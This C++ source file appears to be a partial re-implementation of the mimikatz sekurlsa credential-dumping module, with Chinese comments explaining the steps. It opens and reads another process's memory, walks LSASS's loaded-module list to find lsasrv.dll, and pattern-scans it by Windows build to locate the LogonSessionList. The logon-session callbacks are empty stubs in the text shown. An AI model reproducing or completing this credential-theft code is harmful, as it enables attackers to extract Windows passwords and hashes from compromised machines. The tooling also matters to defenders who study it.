#include "header/globals.h"
#include "header/process.h"
using namespace std;
void GetSysInfo() {
	//DWORD* MIMIKATZ_NT_MAJOR_VERSION, DWORD* MIMIKATZ_NT_MINOR_VERSION, DWORD* MIMIKATZ_NT_BUILD_NUMBER
    //获取系统信息
    HMODULE hDll = ::LoadLibrary("ntdll.dll");
    typedef void (WINAPI* getver)(DWORD*, DWORD*, DWORD*);
    getver RtlGetNtVersionNumbers = (getver)GetProcAddress(hDll, "RtlGetNtVersionNumbers");
    RtlGetNtVersionNumbers(&MIMIKATZ_NT_MAJOR_VERSION, &MIMIKATZ_NT_MINOR_VERSION, &MIMIKATZ_NT_BUILD_NUMBER);
	MIMIKATZ_NT_BUILD_NUMBER &= 0x00007fff;
}




BOOL kull_m_memory_open(IN KULL_M_MEMORY_TYPE Type, IN HANDLE hAny, OUT PKULL_M_MEMORY_HANDLE* hMemory)
{
	BOOL status = FALSE;

	*hMemory = (PKULL_M_MEMORY_HANDLE)LocalAlloc(LPTR, sizeof(KULL_M_MEMORY_HANDLE));
	if (*hMemory)
	{
		(*hMemory)->type = Type;
		switch (Type)
		{
		case KULL_M_MEMORY_TYPE_PROCESS:
			if ((*hMemory)->pHandleProcess = (PKULL_M_MEMORY_HANDLE_PROCESS)LocalAlloc(LPTR, sizeof(KULL_M_MEMORY_HANDLE_PROCESS)))
			{
				(*hMemory)->pHandleProcess->hProcess = hAny;
				status = TRUE;
			}
			break;
		default:
			break;
		}
		if (!status)
			LocalFree(*hMemory);
	}
	return status;
}
BOOL kull_m_memory_copy(OUT PKULL_M_MEMORY_ADDRESS Destination, IN PKULL_M_MEMORY_ADDRESS Source, IN SIZE_T Length)
{
	BOOL status = FALSE;
	BOOL bufferMeFirst = FALSE;
	KULL_M_MEMORY_ADDRESS aBuffer = { NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE };
	DWORD nbReadWrite;

	switch (Destination->hMemory->type)
	{
	case KULL_M_MEMORY_TYPE_OWN:
		switch (Source->hMemory->type)
		{
		case KULL_M_MEMORY_TYPE_OWN:
			RtlCopyMemory(Destination->address, Source->address, Length);
			status = TRUE;
			break;
		case KULL_M_MEMORY_TYPE_PROCESS:
			status = ReadProcessMemory(Source->hMemory->pHandleProcess->hProcess, Source->address, Destination->address, Length, NULL);
			break;
		case KULL_M_MEMORY_TYPE_FILE:
			if (SetFilePointer(Source->hMemory->pHandleFile->hFile, PtrToLong(Source->address), NULL, FILE_BEGIN) != INVALID_SET_FILE_POINTER)
				status = ReadFile(Source->hMemory->pHandleFile->hFile, Destination->address, (DWORD)Length, &nbReadWrite, NULL);
			break;
		default:
			break;
		}
		break;
	case KULL_M_MEMORY_TYPE_PROCESS:
		switch (Source->hMemory->type)
		{
		case KULL_M_MEMORY_TYPE_OWN:
			status = WriteProcessMemory(Destination->hMemory->pHandleProcess->hProcess, Destination->address, Source->address, Length, NULL);
			break;
		default:
			bufferMeFirst = TRUE;
			break;
		}
		break;
	case KULL_M_MEMORY_TYPE_FILE:
		switch (Source->hMemory->type)
		{
		case KULL_M_MEMORY_TYPE_OWN:
			if (!Destination->address || SetFilePointer(Destination->hMemory->pHandleFile->hFile, PtrToLong(Destination->address), NULL, FILE_BEGIN))
				status = WriteFile(Destination->hMemory->pHandleFile->hFile, Source->address, (DWORD)Length, &nbReadWrite, NULL);
			break;
		default:
			bufferMeFirst = TRUE;
			break;
		}
		break;
	default:
		break;
	}

	if (bufferMeFirst)
	{
		if (aBuffer.address = LocalAlloc(LPTR, Length))
		{
			if (kull_m_memory_copy(&aBuffer, Source, Length))
				status = kull_m_memory_copy(Destination, &aBuffer, Length);
			LocalFree(aBuffer.address);
		}
	}
	return status;
}
BOOL kull_m_process_getUnicodeString(IN PUNICODE_STRING string, IN PKULL_M_MEMORY_HANDLE source)
{
	BOOL status = FALSE;
	KULL_M_MEMORY_HANDLE hOwn = { KULL_M_MEMORY_TYPE_OWN, NULL };
	KULL_M_MEMORY_ADDRESS aDestin = { NULL, &hOwn };
	KULL_M_MEMORY_ADDRESS aSource = { string->Buffer, source };

	string->Buffer = NULL;
	if (aSource.address && string->MaximumLength)
	{
		if (aDestin.address = LocalAlloc(LPTR, string->MaximumLength))
		{
			string->Buffer = (PWSTR)aDestin.address;
			status = kull_m_memory_copy(&aDestin, &aSource, string->MaximumLength);
		}
	}
	return status;
}
BOOL kull_m_process_getSid(IN PSID* pSid, IN PKULL_M_MEMORY_HANDLE source)
{
	BOOL status = FALSE;
	BYTE nbAuth;
	DWORD sizeSid;
	KULL_M_MEMORY_HANDLE hOwn = { KULL_M_MEMORY_TYPE_OWN, NULL };
	KULL_M_MEMORY_ADDRESS aDestin = { &nbAuth, &hOwn };
	KULL_M_MEMORY_ADDRESS aSource = { (PBYTE)*pSid + 1, source };

	*pSid = NULL;
	if (kull_m_memory_copy(&aDestin, &aSource, sizeof(BYTE)))
	{
		aSource.address = (PBYTE)aSource.address - 1;
		sizeSid = 4 * nbAuth + 6 + 1 + 1;

		if (aDestin.address = LocalAlloc(LPTR, sizeSid))
		{
			*pSid = (PSID)aDestin.address;
			status = kull_m_memory_copy(&aDestin, &aSource, sizeSid);
		}
	}
	return status;
}

NTSTATUS kull_m_process_getVeryBasicModuleInformations(PKULL_M_MEMORY_HANDLE memory, PKULL_M_MODULE_ENUM_CALLBACK callBack, PVOID pvArg)
{
	NTSTATUS status = STATUS_DLL_NOT_FOUND;
	PLDR_DATA_TABLE_ENTRY pLdrEntry;
	PEB Peb; PEB_LDR_DATA LdrData; LDR_DATA_TABLE_ENTRY LdrEntry;
#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
	PLDR_DATA_TABLE_ENTRY_F32 pLdrEntry32;
	PEB_F32 Peb32; PEB_LDR_DATA_F32 LdrData32; LDR_DATA_TABLE_ENTRY_F32 LdrEntry32;
#endif
	ULONG i;
	KULL_M_MEMORY_ADDRESS aBuffer = { NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE };
	KULL_M_MEMORY_ADDRESS aProcess = { NULL, memory };
	PBYTE aLire, fin;
	PWCHAR moduleNameW;
	UNICODE_STRING moduleName;
	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION moduleInformation;
	BOOL continueCallback = TRUE;
	moduleInformation.DllBase.hMemory = memory;
	switch (memory->type)
	{
	case KULL_M_MEMORY_TYPE_PROCESS:
		moduleInformation.NameDontUseOutsideCallback = &moduleName;
		if (kull_m_process_peb(memory, &Peb, FALSE))  //这一步应该是寻找基址，根据之后的结果是基址加偏移确定的判断的
		{
			aBuffer.address = &LdrData; aProcess.address = Peb.Ldr;
			if (kull_m_memory_copy(&aBuffer, &aProcess, sizeof(LdrData)))
			{
				/**
				* 读取LSASS.exe进程中LSASRV.dll模块的内存，模块加载地址和大小是通过PEB.Ldr.InMemoryOrderModuleList获取
				* 读取成功后通过回调函数将dll的基址，SizeOfImage等信息存到lsassPackages这个数组对应的元素里
				*/
				for (
					aLire = (PBYTE)(LdrData.InMemoryOrderModulevector.Flink) - FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks),
					fin = (PBYTE)(Peb.Ldr) + FIELD_OFFSET(PEB_LDR_DATA, InLoadOrderModulevector);
					(aLire != fin) && continueCallback;
					aLire = (PBYTE)LdrEntry.InMemoryOrderLinks.Flink - FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks)
					)
				{
					aBuffer.address = &LdrEntry; aProcess.address = aLire;
					if (continueCallback = kull_m_memory_copy(&aBuffer, &aProcess, sizeof(LdrEntry)))
					{
						moduleInformation.DllBase.address = LdrEntry.DllBase;
						moduleInformation.SizeOfImage = LdrEntry.SizeOfImage;
						moduleName = LdrEntry.BaseDllName;
						if (moduleName.Buffer = (PWSTR)LocalAlloc(LPTR, moduleName.MaximumLength))
						{
							aBuffer.address = moduleName.Buffer; aProcess.address = LdrEntry.BaseDllName.Buffer;
							if (kull_m_memory_copy(&aBuffer, &aProcess, moduleName.MaximumLength))
							{
								kull_m_process_adjustTimeDateStamp(&moduleInformation);
								continueCallback = callBack(&moduleInformation, pvArg);
								//callback进入kuhl_m_sekurlsa_findlibs函数，里面会将进程的全部dll模块进行匹配获取对于的模块信息
							}
							LocalFree(moduleName.Buffer);
						}
					}
				}
				status = STATUS_SUCCESS;
			}
		}
		if (continueCallback && NT_SUCCESS(status) && kull_m_process_peb(memory, (PPEB)&Peb32, TRUE))
		{
			
		}
		break;
	default:
		break;
	}

	return status;
}


void kull_m_process_adjustTimeDateStamp(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION information)
{
	PIMAGE_NT_HEADERS ntHeaders;
	if (kull_m_process_ntheaders(&information->DllBase, &ntHeaders))
	{
		information->TimeDateStamp = ntHeaders->FileHeader.TimeDateStamp;
		LocalFree(ntHeaders);
	}
	else information->TimeDateStamp = 0;
}


BOOL kull_m_process_ntheaders(PKULL_M_MEMORY_ADDRESS pBase, PIMAGE_NT_HEADERS* pHeaders)
{
	BOOL status = FALSE;
	IMAGE_DOS_HEADER headerImageDos;
	KULL_M_MEMORY_ADDRESS aBuffer = { &headerImageDos, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE }, aRealNtHeaders = { NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE }, aProcess = { NULL, pBase->hMemory };
	DWORD size;

	if (kull_m_memory_copy(&aBuffer, pBase, sizeof(IMAGE_DOS_HEADER)) && headerImageDos.e_magic == IMAGE_DOS_SIGNATURE)
	{
		aProcess.address = (PBYTE)pBase->address + headerImageDos.e_lfanew;
		if (aBuffer.address = LocalAlloc(LPTR, sizeof(DWORD) + IMAGE_SIZEOF_FILE_HEADER))
		{
			if (kull_m_memory_copy(&aBuffer, &aProcess, sizeof(DWORD) + IMAGE_SIZEOF_FILE_HEADER) && ((PIMAGE_NT_HEADERS)aBuffer.address)->Signature == IMAGE_NT_SIGNATURE);
			{
				size = (((PIMAGE_NT_HEADERS)aBuffer.address)->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) ? sizeof(IMAGE_NT_HEADERS32) : sizeof(IMAGE_NT_HEADERS64);
				if (aRealNtHeaders.address = (PIMAGE_NT_HEADERS)LocalAlloc(LPTR, size))
				{
					status = kull_m_memory_copy(&aRealNtHeaders, &aProcess, size);

					if (status)
						*pHeaders = (PIMAGE_NT_HEADERS)aRealNtHeaders.address;
					else
						LocalFree(aRealNtHeaders.address);
				}
			}
			LocalFree(aBuffer.address);
		}
	}
	return status;
}

BOOL CALLBACK kuhl_m_sekurlsa_findlibs(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg)
{
	ULONG i;
	for (i = 0; i < 1; i++)
	{
		cout << lsassPackages[i]->ModuleName << endl;
		if (_wcsicmp(lsassPackages[i]->ModuleName, pModuleInformation->NameDontUseOutsideCallback->Buffer) == 0)
		{
			lsassPackages[i]->Module.isPresent = TRUE;
			lsassPackages[i]->Module.Informations = *pModuleInformation;
		}
	}
	return TRUE;
}
void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_msv(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	return;
}
void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_credman(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	return;
}


BOOL kuhl_m_sekurlsa_utils_search(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib)
{	
	PVOID* pLogonSessionListCount = (cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_2K3) ? NULL : ((PVOID*)&LogonSessionListCount);
	return kuhl_m_sekurlsa_utils_search_generic(cLsass, pLib, LsaSrvReferences, 11, (PVOID*)&LogonSessionList, pLogonSessionListCount, NULL, NULL);
}

BOOL kuhl_m_sekurlsa_utils_search_generic(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib, PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, PVOID* genericPtr, PVOID* genericPtr1, PVOID* genericPtr2, PLONG genericOffset1)
{
	KULL_M_MEMORY_ADDRESS aLsassMemory = { NULL, cLsass->hLsassMem }, aLocalMemory = { NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE };
	KULL_M_MEMORY_SEARCH sMemory = { {{pLib->Informations.DllBase.address, cLsass->hLsassMem}, pLib->Informations.SizeOfImage}, NULL };
	PKULL_M_PATCH_GENERIC currentReference;
#if defined(_M_X64)
	LONG offset;
#endif

	if (currentReference = kull_m_patch_getGenericFromBuild(generics, cbGenerics, cLsass->osContext.BuildNumber))
	{
		aLocalMemory.address = currentReference->Search.Pattern;
		if (kull_m_memory_search(&aLocalMemory, currentReference->Search.Length, &sMemory, FALSE))
		{
			aLsassMemory.address = (PBYTE)sMemory.result + currentReference->Offsets.off0; // optimize one day
			if (genericOffset1)
				*genericOffset1 = currentReference->Offsets.off1;
#if defined(_M_ARM64)
			*genericPtr = kull_m_memory_arm64_getRealAddress(&aLsassMemory, currentReference->Offsets.armOff0); // TODO:ARM64
			pLib->isInit = (*genericPtr) ? TRUE : FALSE;
#elif defined(_M_X64)
			aLocalMemory.address = &offset;
			if (pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
				*genericPtr = ((PBYTE)aLsassMemory.address + sizeof(LONG) + offset);
#elif defined(_M_IX86)
			aLocalMemory.address = genericPtr;
			pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID));
#endif

			if (genericPtr1)
			{
				aLsassMemory.address = (PBYTE)sMemory.result + currentReference->Offsets.off1;
#if defined(_M_ARM64)
				*genericPtr1 = kull_m_memory_arm64_getRealAddress(&aLsassMemory, currentReference->Offsets.armOff1); // TODO:ARM64
				pLib->isInit = (*genericPtr1) ? TRUE : FALSE;
#elif defined(_M_X64)
				aLocalMemory.address = &offset;
				if (pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
					*genericPtr1 = ((PBYTE)aLsassMemory.address + sizeof(LONG) + offset);
#elif defined(_M_IX86)
				aLocalMemory.address = genericPtr1;
				pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID));
#endif
			}

			if (genericPtr2)
			{
				aLsassMemory.address = (PBYTE)sMemory.result + currentReference->Offsets.off2;
#if defined(_M_ARM64)
				*genericPtr2 = kull_m_memory_arm64_getRealAddress(&aLsassMemory, currentReference->Offsets.armOff2); // TODO:ARM64
				pLib->isInit = (*genericPtr2) ? TRUE : FALSE;
#elif defined(_M_X64)
				aLocalMemory.address = &offset;
				if (pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
					*genericPtr2 = ((PBYTE)aLsassMemory.address + sizeof(LONG) + offset);
#elif defined(_M_IX86)
				aLocalMemory.address = genericPtr2;
				pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID));
#endif
			}
		}
	}
	return pLib->isInit;
}

PKULL_M_PATCH_GENERIC kull_m_patch_getGenericFromBuild(PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, DWORD BuildNumber)
{
	SIZE_T i;
	PKULL_M_PATCH_GENERIC current = NULL;

	for (i = 0; i < cbGenerics; i++)
	{
		if (generics[i].MinBuildNumber <= BuildNumber)
			current = &generics[i];
		else break;
	}
	return current;
}

BOOL kull_m_memory_search(IN PKULL_M_MEMORY_ADDRESS Pattern, IN SIZE_T Length, IN PKULL_M_MEMORY_SEARCH Search, IN BOOL bufferMeFirst)
{
	BOOL status = FALSE;
	KULL_M_MEMORY_SEARCH  sBuffer = { {{NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, Search->kull_m_memoryRange.size}, NULL };
	PBYTE CurrentPtr;
	PBYTE limite = (PBYTE)Search->kull_m_memoryRange.kull_m_memoryAdress.address + Search->kull_m_memoryRange.size;

	switch (Pattern->hMemory->type)
	{
	case KULL_M_MEMORY_TYPE_OWN:
		switch (Search->kull_m_memoryRange.kull_m_memoryAdress.hMemory->type)
		{
		case KULL_M_MEMORY_TYPE_OWN:
			for (CurrentPtr = (PBYTE)Search->kull_m_memoryRange.kull_m_memoryAdress.address; !status && (CurrentPtr + Length <= limite); CurrentPtr++)
				status = RtlEqualMemory(Pattern->address, CurrentPtr, Length);
			CurrentPtr--;
			break;
		case KULL_M_MEMORY_TYPE_PROCESS:
		case KULL_M_MEMORY_TYPE_FILE:
		case KULL_M_MEMORY_TYPE_KERNEL:
			if (sBuffer.kull_m_memoryRange.kull_m_memoryAdress.address = LocalAlloc(LPTR, Search->kull_m_memoryRange.size))
			{
				if (kull_m_memory_copy(&sBuffer.kull_m_memoryRange.kull_m_memoryAdress, &Search->kull_m_memoryRange.kull_m_memoryAdress, Search->kull_m_memoryRange.size))
					if (status = kull_m_memory_search(Pattern, Length, &sBuffer, FALSE))
						CurrentPtr = (PBYTE)Search->kull_m_memoryRange.kull_m_memoryAdress.address + (((PBYTE)sBuffer.result) - (PBYTE)sBuffer.kull_m_memoryRange.kull_m_memoryAdress.address);
				LocalFree(sBuffer.kull_m_memoryRange.kull_m_memoryAdress.address);
			}
			break;
		
		default:
			break;
		}
		break;
	default:
		break;
	}

	Search->result = status ? CurrentPtr : NULL;

	return status;
}

